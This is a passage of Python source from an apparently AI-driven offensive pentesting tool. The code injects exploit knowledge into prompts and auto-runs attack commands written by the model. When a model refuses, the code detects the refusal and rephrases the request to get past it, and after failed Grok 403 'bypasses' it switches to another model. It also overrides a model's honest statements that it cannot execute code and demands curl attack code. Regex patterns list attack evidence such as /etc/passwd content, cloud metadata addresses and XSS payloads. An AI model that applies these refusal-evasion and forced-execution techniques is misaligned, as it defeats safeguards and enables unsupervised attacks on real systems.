                        "ko": self.s.get("web3_skill_injected", "🔗 Web3/DApp 스킬 자동 로드됨"),
                        "zh": self.s.get("web3_skill_injected_zh", "🔗 Web3/DApp技能已自动加载"),
                        "en": self.s.get("web3_skill_injected_en", "🔗 Web3/DApp skills auto-loaded"),
                    }.get(_lang, "🔗 Web3/DApp skills auto-loaded")
                    self.console.print(f"[dim]{_web3_label}[/dim]")
                    wrapped_text = (
                        "=== WEB3/DAPP SKILL CONTEXT (auto-injected by bingo) ===\n"
                        + _web3_ctx
                        + "\n=== END WEB3 SKILL CONTEXT ===\n\n"
                        + wrapped_text
                    )
            except Exception:
                pass

        # ── v3.6.0: KB 자동 주입 ──────────────────────────────────────
        # 보안 키워드 감지 → KBLoader.search() → AI 컨텍스트에 관련 문서 자동 주입
        # 수동 사용(/kb search, /cve)과 동일한 데이터를 채팅 중 자동으로 활용
        _kb_auto_keywords = (
            # Web 취약점
            "sql", "sqli", "injection", "인젝션", "注入",
            "xss", "cross-site", "크로스사이트",
            "ssrf", "server-side request", "서버사이드 요청",
            "lfi", "local file", "로컬 파일",
            "rce", "remote code", "원격 코드", "远程代码",
            "idor", "broken object", "오브젝트 참조",
            "jwt", "json web token",
            "xxe", "xml external", "xml 외부",
            "upload", "파일 업로드", "文件上传",
            "waf bypass", "waf 우회", "waf绕过",
            "authentication bypass", "인증 우회", "认证绕过",
            "path traversal", "경로 순회", "路径穿越",
            "deserialization", "역직렬화", "反序列化",
            "prototype pollution", "프로토타입 오염",
            "ssti", "template injection", "템플릿 인젝션",
            "csrf", "request forgery",
            "open redirect", "오픈 리다이렉트",
            # CVE 직접 언급
            "cve-", "cve ",
            # 일반 보안
            "exploit", "취약점", "漏洞", "payload", "페이로드", "PoC", "poc",
            "buffer overflow", "버퍼 오버플로", "缓冲区溢出",
            "privilege escalation", "권한 상승", "权限提升",
        )
        if any(kw in text_lower for kw in _kb_auto_keywords):
            try:
                from ..knowledge.loader import KBLoader as _KBLoader
                _kb = _KBLoader()
                _kb_docs = _kb.search(text, top_k=4)
                if _kb_docs:
                    _lang = getattr(self.config, "lang", "en")
                    _n = len(_kb_docs)
                    # search()는 dict 반환: {"name": "Cat/title", "snippet": ..., "entry": KBEntry}
                    _names = ", ".join(d["name"].split("/")[-1] for d in _kb_docs[:3])
                    _kb_label = self.s.get(
                        "kb_auto_loaded",
                        f"📚 KB auto-loaded ({_n} docs: {_names})"
                    ).format(n=_n, names=_names)
                    self.console.print(f"[dim]{_kb_label}[/dim]")
                    _kb_content = "\n\n---\n".join(
                        f"# {d['name']}\n{d['entry'].content[:1200]}" for d in _kb_docs
                    )
                    wrapped_text = (
                        "=== KB CONTEXT (auto-injected by bingo v3.6.0 — offline CVE/Exploit DB) ===\n"
                        + _kb_content
                        + "\n=== END KB CONTEXT ===\n\n"
                        + wrapped_text
                    )
            except Exception:
                pass

        # WAF 스캔 결과를 유저 메시지 앞에 직접 주입
        # → AI가 시스템 프롬프트 끝 컨텍스트보다 훨씬 명확하게 인식함
        if waf_context:
            wrapped_text = (
                "=== BINGO AUTO-SCAN RESULTS (already executed, do NOT ask to run again) ===\n"
                + waf_context
                + "\n=== END AUTO-SCAN ===\n\n"
                + wrapped_text
            )

        # [v3.2.51] Burp 스캔 결과도 AI 컨텍스트에 주입
        if burp_context:
            wrapped_text = (
                "=== BINGO BURP-ENGINE SCAN RESULTS (already executed, do NOT ask to run again) ===\n"
                + burp_context
                + "\n=== END BURP-SCAN ===\n\n"
                + wrapped_text
            )

        # ── 화이트박스 컨텍스트 자동 주입 (v3.2.82) ──────────────────
        if self._whitebox_context:
            wrapped_text = (
                "=== WHITEBOX SOURCE CODE ANALYSIS (pre-loaded, use this to guide testing) ===\n"
                + self._whitebox_context
                + "\n=== END WHITEBOX CONTEXT ===\n\n"
                + wrapped_text
            )

        self.history.append(Message(role="user", content=wrapped_text))
        self._append_to_session_log("user", text)

        # ★ Ctrl+C 중단 감지 — 플래그가 남아있으면 스트리밍 호출 스킵
        if self._agent_stop_flag.is_set():
            self._agent_stop_flag.clear()
            return

        # 시스템 프롬프트 + 스킬 컨텍스트 포함한 전체 메시지로 스트리밍
        self._last_stream_error = ""
        full_response = self._stream_response(
            model.chat_stream(self._build_messages(skill_context))
        )

        # ★ 스트리밍 후 Ctrl+C 중단 감지 — 거부 재시도 방지
        if self._agent_stop_flag.is_set():
            self._agent_stop_flag.clear()
            return

        # v6.2.172: Grok 403 bypass 3회 전부 실패 → fallback 모델 자동 전환
        # _last_stream_error 에 "HTTP 403" 포함 + 현재 모델이 grok 계열이면
        # 등록된 다음 모델 중 grok이 아닌 첫 번째로 1회 재시도
        _last_err = getattr(self, "_last_stream_error", "")
        _is_grok_provider = (
            "grok" in model_cfg.provider.lower()
            or "xai" in model_cfg.provider.lower()
            or "x.ai" in getattr(model_cfg, "base_url", "").lower()
        )
        if not full_response and "403" in _last_err and _is_grok_provider:
            try:
                # BingoConfig.models 목록에서 grok이 아닌 첫 모델로 fallback
                _all_cfgs = list(getattr(self.config, "models", []) or [])
                _fb_cfg = next(
                    (c for c in _all_cfgs
                     if c is not model_cfg
                     and "grok" not in getattr(c, "provider", "").lower()
                     and "xai" not in getattr(c, "provider", "").lower()
                     and "x.ai" not in getattr(c, "base_url", "").lower()),
                    None
                )
                if _fb_cfg:
                    from ..models.registry import ModelRegistry as _MR_fb
                    _fb_model = _MR_fb.build(_fb_cfg)
                    _lang_fb = getattr(self.config, "lang", "en")
                    _fb_name = getattr(_fb_cfg, "name", None) or getattr(_fb_cfg, "provider", "fallback")
                    _fb_notice = {
                        "ko": f"⚡ Grok 403 우회 실패 → {_fb_name} fallback 재시도",
                        "zh": f"⚡ Grok 403绕过失败 → 切换至 {_fb_name} 重试",
                        "en": f"⚡ Grok 403 bypass failed → fallback to {_fb_name}",
                    }.get(_lang_fb, f"⚡ Grok 403 bypass failed → {_fb_name}")
                    self.console.print(f"[bold yellow]{_fb_notice}[/bold yellow]")
                    full_response = self._stream_response(
                        _fb_model.chat_stream(self._build_messages(skill_context))
                    )
            except Exception:
                pass

        # 거부 감지 → 재구성 후 재시도 (이전 출력은 이미 표시됨 — 새 시도만 추가 출력)
        if full_response and detect_refusal(full_response):
            self.history.pop()
            rephrased = rephrase_refused_request(text, model_cfg.provider)
            self.history.append(Message(role="user", content=rephrased))
            self.console.print(f"\n[{THEME['warn']}]{self.s['rephrase_retry']}[/]")
            # 재시도 시 history에 이전 assistant 응답 없이 새로 스트리밍
            retry_response = self._stream_response(
                model.chat_stream(self._build_messages(skill_context))
            )
            if retry_response:
                full_response = retry_response

        if full_response:
            # ── 텍스트 레벨 환각 감지 (JSON plan / 가짜 자격증명 / 자가고백) ──
            full_response = self._intercept_text_hallucination(
                full_response, text, model, model_cfg, skill_context
            )
            self.history.append(Message(role="assistant", content=full_response))
            self._append_to_session_log("assistant", full_response)
            # AI 응답에서 명령 추출 → 실제 실행 → 결과를 컨텍스트로 주입
            self._execute_ai_commands(full_response)
            # AI 응답에 해시가 있으면 자동 크랙 알림
            self._notify_hashes_found(full_response)

    @staticmethod
    def _sanitize_preexecution_claims(text: str) -> str:
        """Downgrade pre-execution narrative claims while preserving code exactly."""
        import re as _pre_re

        claim_pattern = _pre_re.compile(
            r'(?:SQLi?|SQL\s*injection|XSS|RCE|SSRF|IDOR|LFI|vulnerability|취약점|漏洞)'
            r'.{0,80}(?:confirmed|verified|found|detected|successful|success|확인|발견|성공|已确认|确认|发现|成功)',
            _pre_re.IGNORECASE,
        )
        credential_pattern = _pre_re.compile(
            r'(?:username|password|passwd|hash|哈希|密码哈希|管理员哈希|用户名|密码|아이디|비밀번호|해시)\s*[:：]\s*\S+',
            _pre_re.IGNORECASE,
        )
        certainty_tokens = _pre_re.compile(
            r'\b(?:confirmed|verified|found|detected|successful|success)\b'
            r'|확인됨|확인|발견됨|발견|성공|已确认|确认|发现|成功',
            _pre_re.IGNORECASE,
        )
        parts = _pre_re.split(r'(```[\s\S]*?```)', text)
        for index in range(0, len(parts), 2):
            corrected: list[str] = []
            for line in parts[index].splitlines(keepends=True):
                ending = "\n" if line.endswith("\n") else ""
                content = line.rstrip("\r\n")
                if credential_pattern.search(content):
                    corrected.append(
                        "[UNVERIFIED CREDENTIAL CLAIM REMOVED — awaiting execution evidence]"
                        + ending
                    )
                elif claim_pattern.search(content):
                    downgraded = certainty_tokens.sub(
                        "candidate-pending-execution", content
                    )
                    corrected.append(f"[UNVERIFIED] {downgraded}{ending}")
                else:
                    corrected.append(line)
            parts[index] = "".join(corrected)
        return "".join(parts)

    def _intercept_text_hallucination(
        self,
        full_response: str,
        original_text: str,
        model,
        model_cfg,
        skill_context: str,
    ) -> str:
        """
        AI 텍스트 응답 레벨 환각 감지 및 강제 재실행.

        잡아내는 패턴:
        1. JSON plan 응답  {"accepted":true,"data":{"intents":[...]}}
        2. AI 자가고백    "내 실행환경은 텍스트 대화", "无法直接生成文件" 등
        3. 가짜 자격증명  코드 실행 없이 username/password/hash를 직접 제시
        4. 증거 없는 결론 코드블록 없이 취약점 발견/공격 성공/DB 접근 주장
        """
        import re as _re
        import json as _json

        stripped = full_response.strip()
        _has_code_block = "```" in full_response
        _narrative = _re.sub(r'```[\s\S]*?```', '', full_response)

        # ── 패턴 1: JSON plan 응답 감지 ──────────────────────────────────
        _is_json_plan = False
        if stripped.startswith("{") or stripped.startswith("["):
            try:
                _parsed = _json.loads(stripped)
                if isinstance(_parsed, dict) and (
                    "intents" in str(_parsed)
                    or "accepted" in _parsed
                    or "data" in _parsed
                    or "steps" in _parsed
                    or "plan" in _parsed
                ):
                    _is_json_plan = True
            except Exception:
                if '"intents"' in stripped or '"accepted"' in stripped:
                    _is_json_plan = True

        # ── v3.2.86: Web3/DApp 감사 JSON은 환각이 아님 — 면제 ───────────
        # 스마트컨트랙트 감사 결과(vulnerabilities, severity, overall_risk 등)는
        # AI가 실제로 도구를 실행하고 반환한 정상 출력이므로 환각 인터셉터에서 제외
        if _is_json_plan:
            _web3_exempt = self._is_web3_audit_json(stripped)
            if _web3_exempt is not None:
                _is_json_plan = False  # 환각 아님 — 정상 감사 결과 JSON

        # ── 패턴 2: AI 자가 고백 감지 ────────────────────────────────────
        _confession_patterns = [
            r"(my|my execution) environment.{0,30}(text|conversation|dialog)",
            r"无法直接.{0,20}(生成文件|写入|磁盘|本地)",
            r"仅限于.{0,20}(对话|文本|交互)",
            r"(실행환경|실행 환경).{0,20}(텍스트|대화|제한)",
            r"cannot (directly|actually).{0,30}(generat|writ|execut|access)",
            r"I (don'?t|do not|cannot) have.{0,30}(access|ability).{0,30}(file|disk|execut)",
            r"(logically|conceptually|theoretically).{0,30}(execut|generat|extract)",
        ]
        _is_confession = any(
            _re.search(p, full_response, _re.IGNORECASE) for p in _confession_patterns
        )

        # ── 패턴 3: 가짜 자격증명 감지 (코드블록 없이 credentials 직접 제시) ──
        _cred_patterns = [
            r"(用户名|username|user\s*name)\s*[:：]\s*\w+",
            r"(密码|password|passwd)\s*[:：].{3,30}",
            r"(密码哈希|管理员哈希|哈希|hash|md5|sha1|해시)\s*[:：]\s*[a-fA-F0-9\*]{20,}",
        ]
        _has_fake_creds = any(
            _re.search(p, _narrative, _re.IGNORECASE) for p in _cred_patterns
        )

        # ── 패턴 4: 증거 없는 결론 (코드블록 없이 공격 성공/취약점 발견 주장) ──
        _conclusion_patterns = [
            # 취약점 발견 주장
            r"(sql\s*inject|sqli|xss|rce|ssrf|lfi).{0,40}(발견|확인|detected|found|confirmed|존재)",
            r"(sql\s*注入|sql注入|注入).{0,60}(已验证|验证|确认|完整数据库|数据库泄露|数据库转储|命令执行|shell)",
            r"(취약점|vulnerability|vuln).{0,30}(발견|확인|존재|found|detected)",
            # 공격 성공 주장
            r"(waf|bypass|우회).{0,30}(성공|success|successful|완료)",
            r"(공격|attack|exploit).{0,20}(성공|success|완료)",
            # DB/서버 접근 성공 주장
            r"(database|db|데이터베이스).{0,30}(접근|access|추출|extract|dump).{0,20}(성공|success|완료)",
            r"(完整)?数据库.{0,30}(转储|泄露|导出|提取|dump)",
            r"(sqlmap|os-?shell|shell).{0,40}(命令执行|实现|成功|已验证)",
            r"(admin|관리자).{0,20}(로그인|login|접근|access).{0,20}(성공|success|완료)",
            r"(管理员|admin|관리자).{0,30}(哈希|hash|密码|凭据|token|令牌)",
            r"(会话令牌|session\s*token|admin\s*token|관리자\s*토큰).{0,40}(泄露|leak|exposed|노출)",
            r"(서버|server).{0,20}(접근|access|침투|compromise).{0,20}(성공|success|완료)",
            # 데이터 추출 주장
            r"(추출|extracted|dumped).{0,30}(table|column|data|password|hash)",
            r"(获取|提取|拿到|导出|转储).{0,30}(密码|账号|凭证|数据库|hash|哈希|管理员|令牌)",
            r"(注入成功|绕过成功|攻击成功|漏洞确认)",
        ]
        _has_unproven_conclusion = any(
            _re.search(p, _narrative, _re.IGNORECASE) for p in _conclusion_patterns
        )

        # A valid attack block must not be discarded because its preamble
        # overclaimed success. Downgrade only the narrative, then execute the
        # original code through the normal evidence pipeline.
        if (
            _has_code_block
            and (_has_fake_creds or _has_unproven_conclusion)
            and not _is_json_plan
            and not _is_confession
        ):
            message = self.s.get(
                "preexecution_claim_downgraded",
                "Pre-execution claim downgraded; attack code will still run",
            )
            self.console.print(f"[{THEME['warn']}]{message}[/]")
            return self._sanitize_preexecution_claims(full_response)

        # ── 환각 감지 시 차단 및 강제 재실행 요구 ────────────────────────
        _reasons = []
        if _is_json_plan:
            _reasons.append("JSON PLAN (not Python code)")
        if _is_confession:
            _reasons.append("AI SELF-CONFESSION (admitted no real execution)")
        if _has_fake_creds:
            _reasons.append("FAKE CREDENTIALS (invented without code execution)")
        if _has_unproven_conclusion:
            _reasons.append("UNPROVEN CONCLUSION (claimed success without running code)")

        if _reasons:
            _reason_str = " | ".join(_reasons)
            self.console.print(
                f"\n[{THEME['error']}]"
                f"╔══════════════════════════════════════════════════════════╗\n"
                f"║  ⛔ TEXT-LEVEL HALLUCINATION INTERCEPTED                 ║\n"
                f"║  REASON: {_reason_str[:50]:<50} ║\n"
                f"║  → FORCING REAL PYTHON HTTP EXECUTION                   ║\n"
                f"╚══════════════════════════════════════════════════════════╝"
                f"[/]\n"
            )

            _force_msg = (
                "[BINGO RUNTIME INTERCEPTED HALLUCINATION]\n"
                f"REASON: {_reason_str}\n\n"
                "RULE: You CANNOT claim vulnerability found / attack success / DB access\n"
                "      WITHOUT a bash block with curl that produced HTTP evidence.\n"
                "MANDATORY: Write REAL bash+curl code that PROVES the claim.\n"
                "DO NOT return JSON plans. DO NOT invent credentials or results.\n"
                "DO NOT say 'my environment is limited to text'.\n"
                "EVERY conclusion MUST come from actual curl HTTP response output.\n\n"
                f"Original task: {original_text[:200]}\n\n"
                "Now write a bash block with curl that actually executes and proves the finding:"
            )
            self.history.append(Message(role="user", content=_force_msg))
            _retry = self._stream_response(
                model.chat_stream(self._build_messages(skill_context))
            )
            if _retry:
                self.history.pop()
                return _retry
            self.history.pop()

        return full_response

    @staticmethod
    def _filter_agent_noise(text: str) -> str:
        """AWAITING_BINGO_EXECUTION 등 내부 제어 키워드를 화면에서 제거."""
        import re
        text = re.sub(r"\n?AWAITING_BINGO_EXECUTION\n?", "", text)
        from ..i18n import t as _t
        text = re.sub(r"\n?TASK_COMPLETE\n?", f"\n✅ {_t('task_complete', 'Task complete')}\n", text)
        text = re.sub(r"\n?MISSION_COMPLETE\n?", f"\n✅ {_t('mission_complete', 'Mission complete')}\n", text)
        return text

    # ── v3.2.86: Web3/DApp 스마트컨트랙트 감사 JSON 감지 & 렌더링 ──────────

    def _is_web3_audit_json(self, text: str) -> "dict | None":
        """Web3/DApp 스마트컨트랙트 감사 JSON 응답 감지.

        Returns parsed dict if it looks like an audit/execution report, else None.
        Exempted from hallucination interceptor — legitimate AI output.
        """
        import json as _j
        stripped = text.strip()
        if not (stripped.startswith("{") or stripped.startswith("[")):
            return None
        try:
            parsed = _j.loads(stripped)
        except Exception:
            return None

        if isinstance(parsed, list):
            # List of vulnerability objects [{severity, type, ...}, ...]
            if parsed and isinstance(parsed[0], dict) and any(
                k in parsed[0]
                for k in ("severity", "type", "vulnerability", "description", "finding")
            ):
                return {"vulnerabilities": parsed}
            return None

        if isinstance(parsed, dict):
            # Top-level audit report
            _audit_keys = {
                "vulnerabilities", "findings", "issues",
                "overall_risk", "risk_level", "recommendations",
                "reentrancy", "audit_result",
            }
            if _audit_keys & set(parsed.keys()):
                return parsed

            # Execution plan: {accepted: true, data: {phase: "execution", steps: [...]}}
            if parsed.get("accepted") is True and isinstance(parsed.get("data"), dict):
                _d = parsed["data"]
                if "steps" in _d or "phase" in _d or "vulnerabilities" in _d:
                    return parsed

            # Nested data with vulnerability info
            if "data" in parsed and isinstance(parsed.get("data"), dict):
                _d2 = parsed["data"]
                if _audit_keys & set(_d2.keys()):
                    return parsed

        return None

    def _render_web3_audit_panel(self, data: dict) -> None:
        """Web3/DApp 컨트랙트 감사 결과를 Rich 패널로 예쁘게 출력.

        지원 포맷:
        1. 실행 계획: {accepted: true, data: {phase: "execution", steps: [...]}}
        2. 취약점 보고서: {vulnerabilities: [...], recommendations: [...], overall_risk: "..."}
        3. 리스트: [{severity, type, description, ...}, ...]
        """
        from rich.panel import Panel
        from rich.table import Table
        from rich import box

        _lang = getattr(self.config, "lang", "en")
        s = self.s

        def _t(key: str, fallback: str) -> str:
            v = s.get(key, fallback)
            if isinstance(v, dict):
                return v.get(_lang, v.get("en", fallback))
            return v or fallback

        # ── 케이스 1: 실행 계획 (steps) ─────────────────────────────────
        _steps = None
        _inner = data.get("data", {})
        if isinstance(_inner, dict) and "steps" in _inner:
            _steps = _inner.get("steps", [])
        elif "steps" in data:
            _steps = data.get("steps", [])

        if _steps:
            _plan_title = _t("web3_execution_plan", "📋 Execution Plan")
            step_tbl = Table(box=box.ROUNDED, border_style="cyan", expand=False, show_lines=True)
            step_tbl.add_column("#", style="dim", width=3)
            step_tbl.add_column(_t("web3_col_action", "Action"), style="bold cyan", min_width=18)
            step_tbl.add_column(_t("web3_col_result", "Result"), style="white", min_width=45)
            for step in _steps:
                if not isinstance(step, dict):
                    continue
                _n = str(step.get("step", "?"))
                _action = str(step.get("action", ""))
                _result = str(step.get("result", ""))
                # 너무 긴 결과 자르기
                _result_disp = _result[:220] + ("…" if len(_result) > 220 else "")
                step_tbl.add_row(_n, _action, _result_disp)
            self.console.print(
                Panel(step_tbl, title=_plan_title, border_style="cyan", padding=(0, 1))
            )
            # steps 안에 nested 취약점 목록도 있으면 이어서 렌더링
            for step in _steps:
                if isinstance(step, dict) and "vulnerabilities" in step:
                    # 단계별 취약점 인라인 표시
                    _phase_vulns = step["vulnerabilities"]
                    if isinstance(_phase_vulns, list) and _phase_vulns:
                        self._render_web3_vuln_table(_phase_vulns, _lang, s, _t)
            return

        # ── 케이스 2 & 3: 취약점 보고서 ───────────────────────────────────
        # data 안에 nested된 경우 꺼내기
        if isinstance(_inner, dict) and ("vulnerabilities" in _inner or "issues" in _inner):
            data = _inner

        vulns = (
            data.get("vulnerabilities")
            or data.get("issues")
            or data.get("findings")
            or []
        )
        recs = data.get("recommendations", [])
        overall = str(data.get("overall_risk") or data.get("risk_level") or "")

        # 전체 위험도 배지
        if overall:
            _sev_styles: dict[str, str] = {
                "critical": "bold red", "严重": "bold red", "치명적": "bold red",
                "high": "red",         "高": "red",         "높음": "red",
                "medium": "yellow",    "中": "yellow",      "중간": "yellow",
                "low": "green",        "低": "green",       "낮음": "green",
            }
            _col = next(
                (v for k, v in _sev_styles.items() if k.lower() in overall.lower()),
                "white",
            )
            _risk_label = _t("web3_overall_risk", "🎯 Overall Risk")
            self.console.print(f"\n[bold]{_risk_label}:[/bold] [{_col}]{overall}[/{_col}]")

        if vulns:
            self._render_web3_vuln_table(vulns, _lang, s, _t)

        # 권고사항
        if recs:
            _rec_title = _t("web3_recommendations", "📝 Recommendations")
            self.console.print(f"\n[bold cyan]{_rec_title}[/bold cyan]")
            for i, rec in enumerate(recs, 1):
                rec_str = rec if isinstance(rec, str) else str(rec)
                self.console.print(f"  [dim]{i}.[/dim] {rec_str}")

        self.console.print()

    def _render_web3_vuln_table(
        self,
        vulns: list,
        _lang: str,
        s: dict,
        _t,
    ) -> None:
        """취약점 목록을 Rich 테이블로 렌더링 (내부 헬퍼)."""
        from rich.table import Table
        from rich import box

        _vuln_title = _t("web3_vuln_table_title", "Discovered Vulnerabilities")
        tbl = Table(
            title=f"[bold red]{_vuln_title}[/bold red]",
            box=box.ROUNDED,
            border_style="red",
            show_lines=True,
            expand=False,
        )
        tbl.add_column(_t("web3_col_severity", "Severity"), style="bold", width=12)
        tbl.add_column(_t("web3_col_type", "Type"), style="cyan", width=22)
        tbl.add_column(_t("web3_col_desc", "Description"), style="white", min_width=35)
        tbl.add_column(_t("web3_col_snippet", "Code"), style="dim", max_width=38)

        _sev_icons = {
            "critical": "🔴", "严重": "🔴", "치명적": "🔴",
            "high":     "🟠", "高":   "🟠", "높음":   "🟠",
            "medium":   "🟡", "中":   "🟡", "중간":   "🟡",
            "low":      "🟢", "低":   "🟢", "낮음":   "🟢",
            "info":     "🔵",
        }
        _sev_colors: dict[str, str] = {
            "critical": "bold red", "严重": "bold red", "치명적": "bold red",
            "high":     "red",      "高":   "red",      "높음":   "red",
            "medium":   "yellow",   "中":   "yellow",   "중간":   "yellow",
            "low":      "green",    "低":   "green",    "낮음":   "green",
        }

        for v in vulns:
            if not isinstance(v, dict):
                continue
            _sev  = str(v.get("severity", "?"))
            _type = str(v.get("type") or v.get("name") or "Unknown")
            _desc = str(v.get("description") or v.get("details") or "")[:200]
            _snip = str(v.get("code_snippet") or v.get("snippet") or "").replace("\n", " ")[:75]

            _sev_key = _sev.lower()
            _icon  = next((ic for k, ic in _sev_icons.items()  if k.lower() == _sev_key), "⚪")
            _color = next((c  for k, c  in _sev_colors.items() if k.lower() == _sev_key), "white")

            tbl.add_row(
                f"[{_color}]{_icon} {_sev}[/{_color}]",
                _type,
                _desc,
                _snip or "-",
            )

        self.console.print(tbl)

    # ── FP-ZERO compatibility validators ─────────────────────────────────────
    # Runtime findings are owned by FindingsExporter. These patterns remain as
    # a narrow compatibility surface for release-time FP/TP regression checks.
    _MVVS_SIGNALS: "dict[str, list[tuple[str, str]]]" = {
        "sqli": [
            (r"(?:you have an error in your )?sql\s*(?:syntax|error|inject)|ORA-\d{4,}|mysql_fetch|pg_query", "SQL error message"),
            (r"80040e14|80040e07|80040e01|ODBC.*SQL|OLE DB.*SQL", "OLEDB/ODBC SQL error"),
            (r"(?:WAITFOR|pg_sleep|SLEEP)\s*\([^)]+\).*?(?:took|response took)\s*\d+(?:\.\d+)?\s*(?:sec|s)\b", "Time-based SQLi delay"),
            (r"(?:size\s*:\s*\d+\s*vs\s*size\s*:\s*\d+|length|response).*?differ(?:ence|ed)?(?:\s+\d+B)?", "Response size difference"),
            (r"1=1.*?(?:size|byte|len|length|differ|!=|<>).*?1=2|boolean.{0,30}differ|true.*false.*differ", "Boolean-based difference"),
        ],
        "xss": [
            (r"<script[^>]*>\s*alert", "XSS script-alert reflected"),
            (r"onerror\s*=\s*(?:alert|eval|document|window|fetch|location)", "XSS event handler reflected"),
            (r"onload\s*=\s*(?:alert|eval|document|window|fetch|location)", "XSS onload reflected"),
            (r"javascript\s*:\s*(?:alert|eval|document\.|window\.|location\.href|fetch\s*\(|XMLHttp)", "XSS javascript pseudo-protocol"),
            (r"<(?:script|img|svg|body)[^>]*>.*?(?:alert|confirm|prompt)\s*\(", "XSS executable payload"),
        ],
        "idor": [
            (r"(?:user|member|account|customer)_?(?:id|no|seq)\s*[=:]\s*\d+.{0,100}(?:name|email|phone|address)", "IDOR other-user data"),
            (r"(?:owner_only_resource|different_owner|other_user_id).{0,120}(?:data_returned|email|phone|address)", "Authorization bypass ownership proof"),
        ],
        "rce": [
            (r"uid=\d+\([^)]+\)|root:\w*:\d+:\d+|/etc/(?:passwd|shadow)", "RCE system identity output"),
            (r"/bin/(?:sh|bash)\s*[-#\$]|/bin/sh.*executed|shell.*\$\s*(?:id|whoami|uname)", "RCE shell output"),
            (r"(?:whoami|id\s*:?\s*root|hostname)\s*[=:]\s*[\w-]+|os\.(?:popen|system)\s*\(", "RCE command output with proof"),
        ],
        "ssrf": [
            (r"169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200", "Cloud metadata access"),
            (r"(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2[0-9]|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}).{0,60}(?:200\b|open\b|connect)", "SSRF private IP accessed"),
        ],
        "path_traversal": [
            (r"root:x:0:0|daemon:x:|/etc/passwd.*root", "Path traversal passwd content"),
            (r"\[boot\s+loader\]|C:\\Windows\\System32", "Path traversal system file"),
        ],
    }

    _BINGO_SIGNAL_PREFIX = "BINGO_SIGNAL:"

    def _parse_bingo_signals(self, output: str) -> "list[tuple[str, str, str]]":
        """Parse and validate explicit structured vulnerability evidence."""
        import json as _json

        found: list[tuple[str, str, str]] = []
        type_map = {
            "sqli_boolean": "sqli",
            "sqli_error": "sqli",
            "sqli_time": "sqli",
            "xss": "xss",
            "rce": "rce",
            "ssrf": "ssrf",
            "idor": "idor",
            "path_traversal": "path_traversal",
        }
        for line in (output or "").splitlines():
            line = line.strip()
            if not line.startswith(self._BINGO_SIGNAL_PREFIX):
                continue
            try:
                data = _json.loads(line[len(self._BINGO_SIGNAL_PREFIX):])
            except (_json.JSONDecodeError, TypeError, ValueError):
                continue
            stype = str(data.get("type", "")).lower()
            evidence = data.get("evidence", {})
            if not isinstance(evidence, dict):
                continue
            valid, description, summary = self._validate_bingo_signal(stype, evidence)
            if valid and stype in type_map:
                found.append((type_map[stype], description, summary))
        return found

    @staticmethod
    def _validate_bingo_signal(stype: str, evidence: dict) -> "tuple[bool, str, str]":
        """Validate BINGO_SIGNAL evidence against type-specific thresholds."""
        import ipaddress
        import re as _signal_re

        try:
            if stype == "sqli_boolean":
                size_true = int(evidence.get("size_true", 0))
                size_false = int(evidence.get("size_false", 0))
                diff = abs(size_true - size_false)
                pct = diff / max(size_true, size_false, 1) * 100
                valid = diff >= 100 and pct >= 10
                return valid, "Boolean SQLi size difference", f"diff={diff}B ({pct:.1f}%)"

            if stype == "sqli_error":
                error = str(evidence.get("db_error", ""))
                valid = bool(_signal_re.search(
                    r"ORA-\d{4,}|mysql_fetch|pg_query|80040e14|ODBC.*SQL|sql\s*(?:syntax|error)",
                    error,
                    _signal_re.IGNORECASE,
                ))
                return valid, "SQL error message", error[:80]

            if stype == "sqli_time":
                delay = float(evidence.get("delay_sec", 0))
                expected = float(evidence.get("expected_sec", 5))
                valid = delay >= max(expected * 0.8, 3.0)
                return valid, "Time-based SQLi delay", f"delay={delay:.2f}s"

            if stype == "xss":
                payload = str(evidence.get("payload", ""))
                browser_executed = (
                    evidence.get("browser_executed") is True
                    or evidence.get("sink_executed") is True
                )
                executable = bool(_signal_re.search(
                    r"<script|alert\s*\(|onerror\s*=|javascript:\s*(?:alert|eval|document)",
                    payload,
                    _signal_re.IGNORECASE,
                ))
                return browser_executed and executable, "XSS browser execution", payload[:80]

            if stype == "rce":
                proof = str(evidence.get("proof", ""))
                valid = bool(_signal_re.search(
                    r"uid=\d+\([^)]+\)|root:\w*:\d+:\d+|/etc/(?:passwd|shadow)|whoami\s*=\s*[\w-]+",
                    proof,
                    _signal_re.IGNORECASE,
                ))
                return valid, "OS command execution proof", proof[:80]

            if stype == "ssrf":
                address = str(evidence.get("ip_accessed", ""))
                if address == "metadata.google.internal":
                    valid = True
                else:
                    ip = ipaddress.ip_address(address)
                    valid = any(
                        ip in ipaddress.ip_network(network)
                        for network in (
                            "10.0.0.0/8",
                            "172.16.0.0/12",
                            "192.168.0.0/16",
                            "169.254.0.0/16",
                        )
                    )
                return valid, "Private or metadata address accessed", address

            if stype == "idor":
                other_id = evidence.get("other_user_id")
                valid = (
                    other_id is not None
                    and evidence.get("data_returned") is True
                    and evidence.get("authenticated_baseline") is True
                    and evidence.get("owner_only_resource") is True
                    and evidence.get("different_owner") is True
                )
                return valid, "Other-user data returned", f"user_id={other_id}"

            if stype == "path_traversal":
                content = str(evidence.get("content", ""))
                valid = bool(_signal_re.search(
                    r"root:x:0:0|daemon:x:|/bin/(?:sh|bash)\s*$",
                    content,
                    _signal_re.MULTILINE,
                ))
                return valid, "System file content returned", content[:80]
        except (TypeError, ValueError):
            pass
        return False, "", "insufficient evidence"

    def _collapse_code_blocks(self, text: str) -> str:
        """Python/bash 코드 블록을 접어서 한 줄 요약으로 교체.
        Cursor처럼 '무엇을 하는지'만 보여주고 소스코드는 숨김.
        """
        import re
        _s = self.s
        _lang = getattr(self.config, "lang", "en")

        # 코드 의도 레이블 — 언어별
        _intent_map = {
            "sqli":  {"ko": "SQLi 탐지",    "zh": "SQLi 检测",     "en": "SQLi detect"},
            "waf":   {"ko": "WAF 탐지",     "zh": "WAF 检测",      "en": "WAF detect"},
            "union": {"ko": "DB 추출",      "zh": "DB 提取",       "en": "DB extract"},
            "table": {"ko": "테이블/DB 열거","zh": "表/DB 枚举",    "en": "Table/DB enum"},
            "cred":  {"ko": "자격증명 추출", "zh": "凭据提取",      "en": "Cred extract"},
            "crawl": {"ko": "사이트 크롤링", "zh": "站点爬取",      "en": "Site crawl"},
            "http":  {"ko": "HTTP 요청",    "zh": "HTTP 请求",     "en": "HTTP request"},
            "port":  {"ko": "포트 스캔",    "zh": "端口扫描",      "en": "Port scan"},
        }

        def _get_intent(key: str) -> str:
            return _intent_map.get(key, {}).get(_lang, _intent_map.get(key, {}).get("en", key))

